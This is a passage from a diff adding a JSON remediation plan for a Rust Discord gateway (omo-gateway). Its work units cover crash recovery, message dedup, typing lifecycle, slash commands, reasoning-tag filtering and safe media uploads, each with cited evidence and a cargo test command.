+      "scenario": "| F15 | A: fail before remote run if durable user write fails; propagate durable completion failure rather than delivered. `cargo test --test test_multiplexer persistence_failure_never_acknowledges_turn` | SQLite trigger `RAISE(ABORT,'write blocked')` on user insert; second variant on session update. RED runner called/delivered; GREEN no run for failed insert, no delivered for failed flush. QA real SQLite triggers and mux, no mocked DB. |",
+      "redCommand": "cargo test --test test_multiplexer persistence_failure_never_acknowledges_turn"
+    },
+    {
+      "id": "U19",
+      "title": "Durable accepted queue and replay",
+      "findings": [
+        "S.F02",
+        "S.F03",
+        "R.R01",
+        "R.R04"
+      ],
+      "files": [
+        "src/multiplexer/actor.rs",
+        "src/multiplexer/router.rs",
+        "src/storage/db.rs",
+        "src/main.rs",
+        "src/dashboard_runtime.rs",
+        "migrations/0017_durable_inbound.sql"
+      ],
+      "tests": [
+        "src/multiplexer/actor.rs"
+      ],
+      "dependsOn": [
+        "U17",
+        "U18"
+      ],
+      "category": "deep",
+      "reason": "Cross-cutting state/protocol contract must remain coherent; split unrelated findings into other units.  Source evidence: | F02 | P1 restart recovery / crash-loop integration | FIX P0 | Accepted queued payloads live only in actor/mailbox (`router.rs:233-239`, `actor.rs:159-160`); ledger stores IDs, not payload (`ledger/service.rs:95-112`). Resume flag is only set on graceful marking/channel close, not turn acceptance. `main.rs:1421-1449` handles Ctrl-C/drain, not SIGTERM/crash, and closes pool without joining actors. Recovery clears marker before routing (`main.rs:379-413`), so failed route or second crash loses retry eligibility. Idle actors are also marked (`router.rs:295-302`), potentially reviving an old failed prompt. H: `session.py:2198-2245,2297-2331`. | | F03 | P1 restart transcript dedup / history fidelity | FIX P1 | `actor.rs:380-381` stores already-rendered attachment text AND attachment metadata; `main.rs:395-404` recovers it with new UUID, empty platform ID, no delivery claim, current time; actor inserts another user row and backend renders attachments again. Each recovery duplicates user rows/attachments and leaves original inbound claim in_progress. H: `session.py:2579-2601,2663-2680`; `message_timestamps.py:114-130`. | | R01 | P1 restart recovery; main/entry shutdown | FIX P1 | `src/main.rs:1421-1450`; `src/dashboard_runtime.rs:22-34,195-205`; `src/multiplexer/actor.rs:126-130,251-264` | `H:gateway/run.py:22824-22830,9030-9044`: Rust handles only Ctrl+C, not SIGTERM. launchd termination bypasses marking, cleanup and daemon Drop. Active turns are not marked at start, so ordinary service termination loses recoverability. Discord task error/panic also leaves select via an unmarked path and returns success. | | R04 | P1 recovery durability | FIX P1 | `src/main.rs:379-405`; `src/multiplexer/actor.rs:126-130,213-219,375-395` | `H:gateway/run.py:9030-9044`; `H:gateway/restart_loop_guard.py:143-155`: clears pending before lookup/route/completion, builds a new UUID with blank platform ID, and actor inserts another user row. A crash or route failure after clear loses retry eligibility; successful replay duplicates the original inbound transcript. Resume-loop protection only works while pending survives. |",
+      "scenario": "| F02 | A: persist accepted payload+state transactionally; mark before execution, retain until completed; recover queued order; handle SIGTERM and join shutdown before pool close. `cargo test --bin omo-gateway recovery_survives_second_crash_and_queued_turns` | Inputs A(active), B(queued), abort child after acceptance signal, reopen twice including crash during recovery. RED B missing/marker cleared early; GREEN A/B recover in order without lost eligibility. QA local child fixture, signal-triggered exit and file DB. |\n\n| F03 | A: store raw input once; resume original event identity/time/claim without re-inserting transcript. `cargo test --bin omo-gateway recovery_preserves_event_payload_once` | UUID U/platform M, attachment notes.txt text X, timestamp 2020-01-01. RED two user rows/two X blocks/new date; GREEN one U row, original metadata/claim and one attachment block. QA real recovery->actor->wire capture. |\n\n- **R01 / A+E:** route SIGINT, SIGTERM, client error/panic through one teardown, propagate unexpected termination status. `cargo test --bin omo-gateway sigterm_preserves_active_turn -- --nocapture`. Payload: local child has one signalled active event `m1`; send SIGTERM to that child only. RED: signal exit with pending=0; GREEN: orderly bounded exit with unfinished event durably recoverable. QA: repeat via isolated `dashboard` entry and injected failing Discord-client future. Existing recovery test at main:1763 does not exercise signals.\n\n- **R04 / A:** replay same stored event identity, retain pending through dispatch/turn completion, avoid fresh duplicate inbound insertion. `cargo test --bin omo-gateway resume_is_durable_and_does_not_duplicate_inbound -- --nocapture`. Payload: pending user row id `m1`, platform ID `p1`; inject route failure, then restart/retry and signal completion. RED: pending lost or two user rows; GREEN: pending retained on failure and exactly one user row after success. QA: terminate isolated replay child after route admission but before completion, restart against same temporary DB; observe retry eligibility without additional side effects.",
+      "redCommand": "cargo test --bin omo-gateway recovery_survives_second_crash_and_queued_turns && cargo test --bin omo-gateway recovery_preserves_event_payload_once && cargo test --bin omo-gateway sigterm_preserves_active_turn -- --nocapture && cargo test --bin omo-gateway resume_is_durable_and_does_not_duplicate_inbound -- --nocapture"
+    },
+    {
+      "id": "U20",
+      "title": "Permanent per-bot conversation lanes",
+      "findings": [
+        "D.D14",
+        "S.F12"
+      ],
+      "files": [
+        "src/models/session.rs",
+        "src/discord/adapter.rs",
+        "src/discord/commands.rs",
+        "src/storage/db.rs"
+      ],
+      "tests": [
+        "tests/test_discord_adapter.rs",
+        "tests/test_multiplexer.rs"
+      ],
+      "dependsOn": [
+        "U09",
+        "U10",
+        "U11",
+        "U17",
+        "U18",
+        "U19"
+      ],
+      "category": "quick",
+      "reason": "Small bounded repair at the existing boundary; no neighboring refactor.  Source evidence: | D14 | P1 auto-thread / scoped participation; permanent channel session invariant | FIX | R:904-929 creates new thread even for InlineReply or free channel; failure falls back publicly R:931-935 rather than preserving thread target. active_threads shared between clients (`PoiseData.clone`, main.rs:1382-1391), and R:1227 always gives implicit guild traffic to primary: secondary bot explicitly engaged in thread cannot receive unmentioned continuation; primary may take over. Active set vanishes at restart. R:1282 and C:661 keep text-channel sessions per user; models/session.rs:59-64 includes user in storage key, violating requested per-bot channel identity (existing test explicitly pins this). H:7125-7217 excludes replies/free channels and fails visibly on auto-thread failure; H:7530 tracks participation. Permanent dedicated conversation policy remains intentional, implementation must honor it. | | F12 | Permanent dedicated guild channel/thread session invariant | FIX P1 | `models/session.rs:64` includes user in key; ingress always uses author for guild channels and defaults per-user threads (`adapter.rs:1284-1288`, `main.rs:113-116`). Two humans addressing same bot/channel get different conversations; commands use same split (`commands.rs:659-673`). H: `session.py:863-881,904-990` configurable shared lanes. User requested per-bot conversation lane, not Hermes per-user defaults. |",
+      "scenario": "| D14 | R thread routing/participation and C::session_key/thread; bot-specific durable participation and canonical shared guild conversation key. Exclude replies/free channels from auto-create; no silent target switch. | `cargo test --test test_discord_adapter dedicated_thread_owner_and_channel_identity` : bot84 engaged thread8; Alice/Bob unmentioned followups after restart; bot42 also connected. RED bot42 takeover/per-user keys -> only84 routes same permanent key. Reply in parent7 does not create thread; forced creation error invokes no agent in parent. |\n\n| F12 | D: canonical guild channel/thread key independent of sender, preserve sender separately; same command routing. `cargo test --test test_multiplexer guild_lane_is_shared_per_bot_not_author` | authors7/8, bot42, guild100/channel200; third message bot84. RED three threads; GREEN two threads, first two same lane. QA ingress converter->mux->peer, distinct DM/thread lanes remain distinct. |",
+      "redCommand": "cargo test --test test_discord_adapter dedicated_thread_owner_and_channel_identity && cargo test --test test_multiplexer guild_lane_is_shared_per_bot_not_author"
+    },
+    {
+      "id": "U21",
+      "title": "Parent-aware profile routing",
+      "findings": [
+        "S.F10"
+      ],
+      "files": [
+        "src/models/events.rs",
+        "src/discord/adapter.rs",
+        "src/multiplexer/profile_routing.rs"
+      ],
+      "tests": [
+        "tests/test_multiplexer.rs"
+      ],
+      "dependsOn": [
+        "U20"
+      ],
+      "category": "quick",
+      "reason": "Small bounded repair at the existing boundary; no neighboring refactor.  Source evidence: | F10 | P1 profile routing; P2 per-channel prompts | FIX P1 | Ingress knows parent but stores thread ID in both channel/thread (`adapter.rs:800-810,1290-1298`; auto-thread:917-921). Router matches channel literally (`profile_routing.rs:121-139,239-246`), so parent-channel route/prompt never applies in its thread. H: `profile_routing.py:76-104` explicitly matches parent_chat_id. Existing precedence test supplies parent as channel artificially (`profile_routing.rs:344-398`). |",
+      "scenario": "| F10 | D: carry parent separately; match parent routes without changing actual egress target. `cargo test --test test_multiplexer thread_inherits_parent_profile` | Discord thread 300 parent 200 guild100, route channel200/modelX. RED no match; GREEN X while destination stays300. QA real converter->mux->thread/start capture; existing synthetic router test insufficient. |",
+      "redCommand": "cargo test --test test_multiplexer thread_inherits_parent_profile"
+    },
+    {
+      "id": "U22",
+      "title": "Durable split-message constituent dedup",
+      "findings": [
+        "D.D03"
+      ],
+      "files": [
+        "src/discord/adapter.rs",
+        "src/ledger/service.rs",
+        "src/storage/db.rs"
+      ],
+      "tests": [
+        "tests/test_discord_adapter.rs"
+      ],
+      "dependsOn": [
+        "U20",
+        "U21"
+      ],
+      "category": "quick",
+      "reason": "Small bounded repair at the existing boundary; no neighboring refactor.  Source evidence: | D03 | P0 #6; P1 transcript dedup | FIX | Debounce is PRESENT: R:492-611 and live R:938-945; actor queues instead of superseding (`src/multiplexer/actor.rs:155-176`). But R:534-546 retains only last constituent ID; claim happens later R:1075-1102. Replaying first chunk runs again; duplicate last chunk inside same batch duplicates its content. Batch generations restart at zero after removal: an older sleeper may flush a replacement batch with equal generation prematurely. Tests R:2857,2924 and `test_discord_adapter:1500` prove aggregation, not constituent dedup or cancel/re-enqueue. H:7558-7641; H:7529-7549 deliberately excludes recovered events from batching because of constituent-ID loss. |",
+      "scenario": "| D03 | R::SplitMessageDebouncer/coalesce + ingress claim boundary: unique lifetime batch token, dedup before merge, durable constituent IDs. | `cargo test --test test_discord_adapter split_batch_replay_and_generation` : IDs 8,9,9 then replay8; paused-time cancel old batch/re-enqueue equal-size new batch. Currently duplicate body/replay/early flush -> one logical body/turn and no early new flush. Observe completed runner/claim rows, not elapsed sleeps. |",
+      "redCommand": "cargo test --test test_discord_adapter split_batch_replay_and_generation"
+    },
+    {
+      "id": "U23",
+      "title": "Recover source-time historical input",
+      "findings": [
+        "D.D15",
+        "S.F17"
+      ],
+      "files": [
+        "src/discord/adapter.rs",
+        "src/models/events.rs",
+        "src/storage/db.rs",
+        "migrations/0018_bot_cursors.sql"
+      ],
+      "tests": [
+        "tests/test_discord_adapter.rs"
+      ],
+      "dependsOn": [
+        "U21",
+        "U22"
+      ],
+      "category": "quick",
+      "reason": "Small bounded repair at the existing boundary; no neighboring refactor.  Source evidence: | D15 | P2 missed-message startup backfill | FIX | Ready R:1046 starts scanner. R:741 advances cursor BEFORE admission/claim; crash during debounce loses recoverability. Backfill R:2497-2604 reads shared channel-only cursors, fetches one 50-message page, passes user_roles=[], treats channel lookup failure as Private, and advances max ID even if route failed. Role-only authorized historical messages are skipped; HTTP metadata failure can bypass guild channel gate; fresh bot's cursor may be advanced by another bot. New channels/threads without cursor never scanned. Hermes H:2003-2081,2147-2243 uses durable attempts/admission, scans configured channels/children. Cursor unit roundtrip R:2666 doesn't exercise replay. | | F17 | P1 message timestamp context | FIX P1 | Formatting exists (`models/events.rs:15-36,84-90`), but `message_to_inbound_with_config` uses InboundEvent::message (`adapter.rs:1302`) whose timestamp is Utc::now (`events.rs:152-168`), not message.timestamp. Backfill uses same converter (`adapter.rs:2570-2595`). Old Discord messages look freshly sent; F03 repeats this on resume. H: `message_timestamps.py:76-130`. Existing timestamp unit tests exercise formatter, not ingress timestamp propagation. |",
+      "scenario": "| D15 | R cursor/update/backfill and ingress timestamp conversion: per-bot atomic monotonic cursors advanced after durable eligibility/claim; preserve source time, replay failed work, role hydration, fail closed on guild metadata failure, page/discover configured targets. | `cargo test --test test_discord_adapter startup_recovery_preserves_work_and_source_time` : Aug14 role-authorized msg8, crash before debounce flush, restore Sep5; msg9 REST metadata fails; two bot scans. RED lost/wrong date/DM bypass -> msg8 dispatched once with Aug14, msg9 not admitted as DM, no cross-bot cursor skip. Include failed-route retry and >50 messages. |\n\n| F17 | D: preserve Discord message.timestamp in converted event and recovery created_at. `cargo test --lib inbound_preserves_original_platform_timestamp` | Message timestamp 2020-01-01T00:00:00Z ingested now. RED event.received_at is now; GREEN exactly source date. QA real conversion used by missed-backfill and render_user_prompt; assert timestamp field, not prompt prose. |",
+      "redCommand": "cargo test --test test_discord_adapter startup_recovery_preserves_work_and_source_time && cargo test --lib inbound_preserves_original_platform_timestamp"
+    },
+    {
+      "id": "U24",
+      "title": "Hydrate referenced attachments",
+      "findings": [
+        "D.D04"
+      ],
+      "files": [
+        "src/discord/adapter.rs"
+      ],
+      "tests": [
+        "tests/test_discord_adapter.rs"
+      ],
+      "dependsOn": [
+        "U23"
+      ],
+      "category": "quick",
+      "reason": "Small bounded repair at the existing boundary; no neighboring refactor.  Source evidence: | D04 | P0 #9 replies | FIX | Text quote is PRESENT R:1259-1280 (500-char cap R:462). Referenced attachments become filenames only; attachments vector R:1241-1255 contains direct/forwarded items, not parent attachments. R:1085 hydrates that vector only, then B:352 renders it. Reply to parent image with `analyze this` loses URL/local file/vision bytes. `test_inbound_hydrates_reply_context_and_attachments` at tests/test_discord_adapter.rs:356 asserts prose only and does not assert attachment vector. H:7219-7226 adds referenced attachments to all_attachments and H:7302 onward caches them. |",
+      "scenario": "| D04 | R::message_to_inbound attachment assembly: union parent attachments by ID before empty check/hydration. | `cargo test --test test_discord_adapter reply_parent_attachment_reaches_prompt` : reply analyze to parent image id100; currently event.attachments empty -> id100 and loopback downloaded local file reach actual turn/start input. Retain quote-cap test. |",
+      "redCommand": "cargo test --test test_discord_adapter reply_parent_attachment_reaches_prompt"
+    },
+    {
+      "id": "U25",
+      "title": "Immediate typing and terminal reactions",
+      "findings": [
+        "D.D09",
+        "S.F14"
+      ],
+      "files": [
+        "src/discord/adapter.rs",
+        "src/multiplexer/actor.rs",
+        "src/multiplexer/router.rs"
+      ],
+      "tests": [
+        "tests/test_discord_adapter.rs",
+        "tests/test_multiplexer.rs"
+      ],
+      "dependsOn": [
+        "U19",
+        "U21",
+        "U24"
+      ],
+      "category": "quick",
+      "reason": "Small bounded repair at the existing boundary; no neighboring refactor.  Source evidence: | D09 | P1 processing reactions; P2 stop/typing | FIX | Persistent start is PRESENT actor.rs:137-147 and R:2209-2217; only explicit multiplexer stop sends Typing(false) (`router.rs:253-263`). B completion/error and actor completion never clear it; final R:1904 removes only typing_refresh, not typing guards. Live R:874-895 adds eyes to every chunk; no production producer of React exists, so success/failure reactions never replace eyes. Ingress typing also starts only after network enrichment, debounce and attachment hydration, not immediately on accepted input. H:2784-2815 and HB:5451-5533 complete reactions and stop typing in cleanup. | | F14 | Persistent typing lifecycle; P2 /stop cleanup | FIX P1 | Actor starts typing before run (`actor.rs:137-146`) but no Completed/error/Shutdown branch stops it. OMO starts it again (`omo_backend.rs:370-379`); final egress removes typing_refresh only (`adapter.rs:1904`), not persistent Typing guard stored at 2211-2216. Only explicit stop sends false (`router.rs:255-263`, adapter:2218). Typing persists after success/failure/GC. H: `stream_events.py:54-67` terminal lifecycle. Immediate typing/final-only are intentional; leaked guard is not. |",
+      "scenario": "| D09 | actor turn lifecycle cleanup (start/finish/cancel) + ingress accepted-event typing hook; propagate reaction source/constituent IDs separately from routed thread target. | `cargo test --test test_discord_adapter processing_lifecycle_cleans_up` : submit two chunks, gate downloader/daemon on signals, finish/error/stop variants. RED no immediate typing/no final cleanup -> start before blocked preparation; zero active guards and eyes removed with correct outcome after completion. |\n\n| F14 | E: send Typing false on success/error/shutdown and remove guard on final egress; balanced per-session lifecycle. `cargo test --test test_multiplexer terminal_outcomes_release_typing` | start A then success/error/cancel, plus parallel B. RED A guard remains; GREEN A inactive, B still active. QA capturing lifecycle dispatcher plus egress guard-state test, terminal signal barrier. |",
+      "redCommand": "cargo test --test test_discord_adapter processing_lifecycle_cleans_up && cargo test --test test_multiplexer terminal_outcomes_release_typing"
+    },
+    {
+      "id": "U26",
+      "title": "Authoritative serialized slash controls",
+      "findings": [
+        "D.D12",
+        "S.F09"
+      ],
+      "files": [
+        "src/discord/commands.rs",
+        "src/multiplexer/actor.rs",
+        "src/multiplexer/router.rs",
+        "src/agent/backend.rs",
+        "src/agent/omo_backend.rs",
+        "src/agent/omo_protocol.rs"
+      ],
+      "tests": [
+        "tests/test_discord_adapter.rs",
+        "tests/test_multiplexer.rs"
+      ],
+      "dependsOn": [
+        "U12",
+        "U13",
+        "U16",
+        "U20",
+        "U25"
+      ],
+      "category": "deep",
+      "reason": "Cross-cutting state/protocol contract must remain coherent; split unrelated findings into other units.  Source evidence: | D12 | P1 slash catalog steer/undo/retry/compress; reset/model | FIX | Catalog PRESENT C:129-148 (18 commands), test C:1241. C:572 reset deletes SQLite only; C:719 undo/C:749 retry/C:791 compress edit local rows. B:158-209 resumes cached daemon thread; B:352 sends only new event, never SQLite history. Thus reset/undo/compress do not change authoritative history, retry appends the old prompt to unchanged history. C:548 model writes DB while live actor retains SessionState; B:353 uses that stale state. C:697 steer routes ordinary event; actor.rs:160 queues until completion, unlike H:5001 steering-after-tool semantics. Commands can mutate SQLite during a live turn and be overwritten. Tests C:1320-1528 exercise SQL, not daemon behavior. | | F09 | P1 slash catalog: model/reset/undo/retry/compress | FIX P0 | `discord/commands.rs:550-589,719-862` mutates SQLite outside actor; actor loads state once and overwrites state_json at completion (`actor.rs:414-434,402-411`). `/model` appears successful but warm actor uses old model. Reset/undo/compress never update remote history; OMO cache can restore reset binding (`omo_backend.rs:165-172`). Retry re-appends to unrewound remote conversation. H: `session.py:2152-2172,2333-2471,2682-2776`. Existing command tests cover SQL only (`commands.rs:1282,1382,1461`). |",
+      "scenario": "| D12 | C command handlers via serialized multiplexer/backend control API; authoritative reset/rollback/compact/model/steer operations, then local mirror. | `cargo test --test test_discord_adapter slash_controls_change_authoritative_session` : daemon holds turns A/B; issue undo/compress/reset/model/steer through interaction fixture. RED daemon history unchanged/stale model/steer only next turn -> observed matching RPC/state before success response and next turn model=m2. If daemon lacks operation, explicit unsupported response rather than false success. |\n\n| F09 | C (+ B serialized protocol extension): actor-serialize controls and mutate authoritative remote thread/history, update/invalidate both caches; report unsupported controls rather than false success. `cargo test --test test_multiplexer live_controls_change_authoritative_session` | Warm r1/model A; `/model B`, next input; `/reset` after secret; undo/retry/compress. RED model A or remote secret retained after claimed removal; GREEN wire B and remote history consistent with acknowledged control. QA command service through mux with stateful remote history, concurrent turn barrier. |\n\nLatest lead addendum falsification: installed threads/metadata-handlers.js:22-24 registers metadata/update only. handlers.js:125 registers compact/start; read-only search of installed threads JavaScript found neither thread/rollback nor numTurns. Treat rollback support as unverified/unsupported on this installed version; capability-check before selecting a real supported history operation. Never acknowledge undo/reset/retry as authoritative if the daemon history remains unchanged. Preserve the desired feature rather than claiming an invented RPC implements it.",
+      "redCommand": "cargo test --test test_discord_adapter slash_controls_change_authoritative_session && cargo test --test test_multiplexer live_controls_change_authoritative_session"
+    },
+    {
+      "id": "U27",
+      "title": "Unicode-safe chunked slash replies",
+      "findings": [
+        "D.D13"
+      ],
+      "files": [
+        "src/discord/commands.rs"
+      ],
+      "tests": [
+        "tests/test_discord_adapter.rs"
+      ],
+      "dependsOn": [
+        "U26"
+      ],
+      "category": "quick",
+      "reason": "Small bounded repair at the existing boundary; no neighboring refactor.  Source evidence: | D13 | P1 slash catalog robustness | FIX | C:355-378 `/skill read` slices UTF-8 at byte 1800: 1799 ASCII bytes followed by `\ud55c` panics. Called from registered skill/skills C:208-231. Other long replies use ctx.say directly (C:306,349,642), bypass chunker. H:4870-4928 dispatches slash through base send/format path; H:2877 chunks output. |",
+      "scenario": "| D13 | C::skill_dispatch preview uses character-safe budget; route long command replies through chunked interaction followups. | `cargo test --test test_discord_adapter slash_skill_read_unicode_and_long_output` : 1799 ASCII + \ud55c + tail from real skills tool fixture, plus >2000-char list. RED panic/oversized body -> handler completes and every emitted body valid under limit. |",
+      "redCommand": "cargo test --test test_discord_adapter slash_skill_read_unicode_and_long_output"
+    },
+    {
+      "id": "U28",
+      "title": "Final reasoning and silence filter",
+      "findings": [
+        "D.D01"
+      ],
+      "files": [
+        "src/agent/omo_backend.rs",
+        "src/discord/adapter.rs",
+        "src/models/events.rs"
+      ],
+      "tests": [
+        "tests/test_discord_adapter.rs"
+      ],
+      "dependsOn": [
+        "U23",
+        "U25",
+        "U26",
+        "U27"
+      ],
+      "category": "quick",
+      "reason": "Small bounded repair at the existing boundary; no neighboring refactor.  Source evidence: | D01 | P0 #11; P1 intentional silence | FIX | B:537-561 takes agentMessage text verbatim; B:623-661 appends a tool badge and emits final Stream. R:1842-1907 only transforms tables before editing. Neither path calls R:133 silence helper or any think scrubber. A completed `<think>secret</think>answer` is public; `NO_REPLY` is posted (with a badge if tools ran). H stream reference: `gateway/stream_consumer.py:406-518`; `gateway/response_filters.py:56-80` distinguishes successful silence from empty failures. Separate reasoning items are not displayed, but inline reasoning is unprotected. |",
+      "scenario": "| D01 | Final-output preparation before badge in B; shared pure filter module; call before final table/media rendering. Keep empty failed turns errors. | `cargo test --test test_discord_adapter final_output_filters_controls` : fake daemon emits `<ThInK>PRIVATE</ThInK>answer`, then separate successful NO_REPLY turn with tool event. REST currently contains PRIVATE/token -> no PRIVATE, zero sends for silence, ordinary prose preserved. |",
+      "redCommand": "cargo test --test test_discord_adapter final_output_filters_controls"
+    },
+    {
+      "id": "U29",
+      "title": "Bot-scoped recoverable dead targets",
+      "findings": [
+        "D.D06",
+        "CR.C12"
+      ],
+      "files": [
+        "src/discord/adapter.rs",
+        "src/storage/db.rs",
+        "migrations/0019_dead_targets.sql"
+      ],
+      "tests": [
+        "tests/test_discord_adapter.rs",
+        "tests/test_cron_egress_parity.rs"
+      ],
+      "dependsOn": [
+        "U23",
+        "U28"
+      ],
+      "category": "quick",
+      "reason": "Small bounded repair at the existing boundary; no neighboring refactor.  Source evidence: | D06 | P1 dead targets | FIX | R:1686-1694 treats every HTTP 403/404 as whole-channel death, including Unknown Message 10008 from reply/edit/delete. R:2015-2026 returns before fallback, R:2117-2160 poisons channel on missing message. Registry keyed only by channel, shared across bots, default no TTL R:1598-1630: bot A permission error disables B; no reachable successful-send recovery because R:1928 returns Ok before sending. Interactive Stream bypasses registry entirely. Existing tests `test_dead_target_short_circuit_in_egress` pin skip-as-success, not error classification. H:2900-2940 and `gateway/dead_targets.py:12-19` exclude reply-target failures from whole-target deaths. | | C12 | P1 dead-target short circuit | FIX | `src/discord/adapter.rs:1599-1693,1819,1842-1908,1927-1933,2008-2020,2088-2120` | `gateway/dead_targets.py:1-20,58-88,97-132`; `gateway/delivery.py:127-141` | Registry exists but is memory-only, keyed only channel across bot clients. Every HTTP 403/404 is treated as whole-chat death, including missing message edit/reference. Default no TTL and skipped sends cannot self-heal. Final Stream bypasses registry entirely. Restart forgets known failures. |",
+      "scenario": "| D06 | R::dead classification/registry/dispatch: API-code-aware, bot-scoped key, bounded retry/probe and structured failed/skipped result; apply to Stream too. | `cargo test --test test_discord_adapter dead_target_is_identity_and_resource_scoped` : REST 404/code10008 for reply8 then success; botA403, botB200 channel7. RED fallback missing/B blocked -> fallback sent/B succeeds. Unknown Channel10003 short-circuits same bot without claiming delivered; virtual expiry probes restored permissions. |\n\n| C12 | Persist bot+channel registry, classify Discord codes not all 404s, return non-delivered receipt for skip, cover Stream, provide recovery probe/clear. `cargo test --test test_cron_egress_parity dead_targets_are_scoped_and_recoverable` | Bot A missing-message 404 on channel42, bot B send same channel: RED blackholed B -> GREEN B sends. Unknown-channel 10003 persists across egress recreation; subsequent send skipped without ACK. Local egress HTTP QA only. |",
+      "redCommand": "cargo test --test test_discord_adapter dead_target_is_identity_and_resource_scoped && cargo test --test test_cron_egress_parity dead_targets_are_scoped_and_recoverable"
+    },
+    {
+      "id": "U30",
+      "title": "Reference triggering message on final",
+      "findings": [
+        "D.D05"
+      ],
+      "files": [
+        "src/models/events.rs",
+        "src/agent/omo_backend.rs",
+        "src/discord/adapter.rs"
+      ],
+      "tests": [
+        "tests/test_discord_adapter.rs"
+      ],
+      "dependsOn": [
+        "U28",
+        "U29"
+      ],
+      "category": "quick",
+      "reason": "Small bounded repair at the existing boundary; no neighboring refactor.  Source evidence: | D05 | P1 reply threading | FIX | SendMessage reference and first-chunk policy PRESENT R:1941-1945,2005-2045, but successful interactive replies are Stream (B:330-342,655), whose placeholder R:1859-1862 has no reference; StreamChunk `src/models/events.rs:180-185` has no anchor. Only actor errors pass reply_to (`actor.rs:226-234`). H:2880-2939 explicitly resolves anchor/falls back. |",
+      "scenario": "| D05 | Add anchor to final response envelope (models/events.rs + B emit); R::stream first send references it with deletion-safe fallback. | `cargo test --test test_discord_adapter final_stream_references_trigger` : trigger8, completed answer -> currently absent reference; GREEN first message_reference.message_id=8, no reference on further chunks; deleted8 retries without anchor. |",
+      "redCommand": "cargo test --test test_discord_adapter final_stream_references_trigger"
+    },
+    {
+      "id": "U31",
+      "title": "Safe final MEDIA uploads",
+      "findings": [
+        "D.D07"
+      ],
+      "files": [
+        "src/discord/adapter.rs"
+      ],
+      "tests": [
+        "tests/test_discord_adapter.rs"
+      ],
+      "dependsOn": [
+        "U30"
+      ],
+      "category": "quick",
+      "reason": "Small bounded repair at the existing boundary; no neighboring refactor.  Source evidence: | D07 | P1 MEDIA upload | FIX (unsupported optional parity) | R:39 extractor exists but no production caller; B:655 -> R:1842 prints `MEDIA:/tmp/report.png` literally. UploadFile R:2165 works when explicitly dispatched, but no agent producer (`OutboundAction` producers searched). H HB:5134-5155 extracts and validates paths, then H:3291-3325 uploads. Parser also truncates quoted paths at whitespace (R:33 regex); wire extraction with full quoted-path grammar and safe path policy, not blind local-file exfiltration. |",
+      "scenario": "| D07 | R final media preparation/extractor and uploader path validation; preserve quoted paths and report failed attachment delivery. | `cargo test --test test_discord_adapter final_media_directive_uploads` : temp file `report one.png`, final `MEDIA:\"<absolute path>\"`; RED literal text -> multipart file bytes once, no directive. Invalid/outside-authorized-root path produces explicit delivery error, no secret upload. |",
+      "redCommand": "cargo test --test test_discord_adapter final_media_directive_uploads"
+    },
+    {
+      "id": "U32",
+      "title": "Valid native voice-note transport",
+      "findings": [
+        "D.D08"
+      ],
+      "files": [
+        "src/discord/adapter.rs",
+        "src/models/events.rs"
+      ],
+      "tests": [
+        "tests/test_discord_adapter.rs"
+      ],
+      "dependsOn": [
+        "U30",
+        "U31"
+      ],
+      "category": "quick",
+      "reason": "Small bounded repair at the existing boundary; no neighboring refactor.  Source evidence: | D08 | P2 native voice notes | FIX (latent transport defect; no active OMO producer) | R:1408 uploader sets flags=8192 for every .ogg/.opus but CreateAttachment has no duration/waveform and no fallback. R:1348 metadata builder is unused. Ordinary OGG files are also forced into voice mode; forum starter is incorrectly flagged. H:3450-3539 includes attachment metadata and file fallback, forum path stays ordinary attachment. Existing `test_build_voice_metadata` only checks detached helper. |",
+      "scenario": "| D08 | R::SerenityFileUploader voice construction only: explicit voice intent, duration/waveform in attachment JSON, ordinary file fallback, no forum voice flag. | `cargo test --test test_discord_adapter native_voice_wire_metadata_and_fallback` : valid OggOpus; surrogate rejects flagged payload lacking metadata. RED rejected -> metadata present and accepted; injected native rejection falls back ordinary file; ordinary .ogg remains document. |",
+      "redCommand": "cargo test --test test_discord_adapter native_voice_wire_metadata_and_fallback"
+    },
+    {
+      "id": "U33",
+      "title": "Configured encoded-audio STT",
+      "findings": [
+        "D.D11"
+      ],
+      "files": [
+        "src/discord/attachments.rs",
+        "src/main.rs"
+      ],
+      "tests": [
+        "tests/test_discord_adapter.rs"
+      ],
+      "dependsOn": [
+        "U19",
+        "U32"
+      ],
+      "category": "quick",
+      "reason": "Small bounded repair at the existing boundary; no neighboring refactor.  Source evidence: | D11 | P2 inbound voice-note STT | FIX (unsupported optional parity) | attachments.rs:195-231 has optional STT hook; main.rs:1373 constructs downloader without with_stt, no concrete SpeechToText production impl. Voice note gets downloaded marker, no transcript. The hook labels entire encoded file as one Opus frame, including WAV detected at attachments.rs:40; provider contract needs encoded-file decoding. H:7235-7244; `gateway/run.py:16631-16706` transcribes cached audio. Agent may independently process local audio, but gateway STT parity is absent. |",
+      "scenario": "| D11 | main downloader STT construction + attachments.rs encoded audio boundary; use configured provider and explicit failure result. | `cargo test --test test_discord_adapter voice_note_transcription_is_wired` : local OGG note with provider transcript marker; RED downloaded-only metadata -> transcript reaches turn/start; WAV decoded correctly, provider failure surfaces neutral failure metadata. No independent agent STT implementation required. |",
+      "redCommand": "cargo test --test test_discord_adapter voice_note_transcription_is_wired"
+    },
+    {
+      "id": "U34",
+      "title": "Lossless fenced and wide PNG tables",
+      "findings": [
+        "D.D17"
+      ],
+      "files": [
+        "src/discord/table_render/mod.rs"
+      ],
+      "tests": [
+        "src/discord/table_render/mod.rs"
+      ],
+      "dependsOn": [],
+      "category": "quick",
+      "reason": "Small bounded repair at the existing boundary; no neighboring refactor.  Source evidence: | D17 | PNG table rendering correctness | FIX | table_render/mod.rs:40-80 has no fenced-code state and :297 uses global replace: a literal fenced Markdown example is extracted/removed as if rendered content. :127-147 wraps only at whitespace; an unbroken long CJK cell overflows its 480px column and gets clipped by SVG canvas. Called on every completed response R:1875/1947. H:4860-4868 format_message uses table-to-bullets; PNG remains intentional but content loss is not. |",
+      "scenario": "| D17 | table_render::extract_markdown_tables/transform/wrap: honor fences and source spans, character-break unspaced text to fit. | `cargo test --lib table_render::tests::fences_and_unbroken_cells_preserve_content` : fenced pipe example plus real table with 100 Korean characters. RED example transformed or glyphs outside canvas -> example preserved, all cell characters inside rendered bounds. QA inspect generated PNG locally, no Discord. |",
+      "redCommand": "cargo test --lib table_render::tests::fences_and_unbroken_cells_preserve_content"
+    },
+    {
+      "id": "U35",
+      "title": "Forum and batched PNG delivery",
+      "findings": [
+        "D.D16"
+      ],
+      "files": [
+        "src/discord/adapter.rs"
+      ],
+      "tests": [
+        "tests/test_discord_adapter.rs"
+      ],
+      "dependsOn": [
+        "U32",
+        "U33"
+      ],
+      "category": "quick",
